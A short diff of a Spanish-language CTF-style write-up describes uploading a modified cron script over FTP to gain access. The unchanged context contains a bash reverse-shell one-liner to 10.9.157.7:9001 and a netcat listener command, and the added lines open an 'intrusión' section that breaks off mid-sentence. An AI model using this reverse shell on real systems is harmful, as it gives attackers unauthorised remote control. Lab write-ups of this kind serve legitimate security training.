@@ -88,3 +88,5 @@ el archivo removed.files.log solo es una captura de la ejecusion del script sin 
 lo primero que vamos hacer sera editar el script.sh para agregar una reverse shell aregando el siguiente comando `bash -c "bash -i >& /dev/tcp/10.9.157.7/9001 0>&1"` una ves hecho esto vamos al servicio ftp y vamos a subir el nuevo script para ello nos posicionamos en la misma ruta donde esta el script anterior y solo hacemos un `put clean.sh` ahora ya tenemos el nuevo script en el sistema sono nos falta ponernos a la escucha con `nc lvnp 9001` este es el puerto que hemos especificado en la reverse shell y ya solo nos queda esperar un par de minutos para conseguir una coneccion
 ![[Pasted image 20240120181957.png]]
 
+### intrusión
+hemos ganado intrusión como el usuario  
